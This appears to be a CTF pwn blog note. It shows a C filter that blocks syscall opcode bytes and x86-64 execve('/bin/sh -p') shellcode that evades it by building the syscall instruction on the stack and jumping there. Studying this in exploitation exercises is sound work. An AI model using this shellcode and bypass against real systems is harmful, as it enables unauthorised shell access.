---
title: shellcode trick
tags: [ctf-pwn,stack]
date: 2023-11-07 22:57:00
categories: [ctf-pwn]
excerpt: shellcode检查机制

---



```c
//检查不许出现syscall的字节： 
if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", l);
      exit(1);
    }

把push 0x50f改成 push 0x50e ; inc qword ptr [rsp] 
shellcode =  \
'''
/* execve(path='/bin///sh', argv=['sh','-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push b'sh\x00-p\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x702d006873
    xor [rsp], rax
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 0xb
    pop rsi
    add rsi, rsp
    push rsi /* '-p\x00' */
    push 0x10
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push 0x3b /* 0x3b */
    pop rax
    //syscall
    push 0x050e
    inc qword ptr [rsp]
    jmp rsp
    nop
'''
```

